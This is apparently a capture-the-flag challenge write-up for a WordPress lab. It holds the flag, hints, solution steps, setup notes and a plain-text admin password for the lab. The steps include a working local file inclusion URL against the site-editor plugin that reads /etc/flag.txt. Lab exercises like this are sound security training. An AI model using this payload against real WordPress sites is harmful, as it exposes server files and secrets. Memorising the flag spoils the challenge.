
## Problem

Just another exposed web server.  You can find the flag in /etc/flag.txt.  NOTE:  NO TOOLS ARE REQUIRED FOR THIS CHALLENGE!

## Flag
acsc18{StillHaventPatched}  (This is the flag that they will have to enter.  Please use this format)

## Category
Web Exploit

## Hints
1. Wordpress gets lots of extra functionality from the plug-ins a site might have installed
1. A number of websites track vulnerabilities associated with these plugins and other software
1. The site-editor plugin has a lot of power over Wordpress

## Steps
1. A look at the page source reveals a plugin called "site-editor"
1. Looking at https://www.exploit-db.com/exploits/44340/ gives the details of the exploit
1. http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/flag.txt


## Resources Required
* Web server
* MySQL server

### Note:  Must use the docker-compose function to get this to work.  Once it's up and running, navigate to installer.php to finish setup and the disable/reenable all plugins.
wordpress user:  admin  password:  vH5OvOIOiKAi@EJJ!F
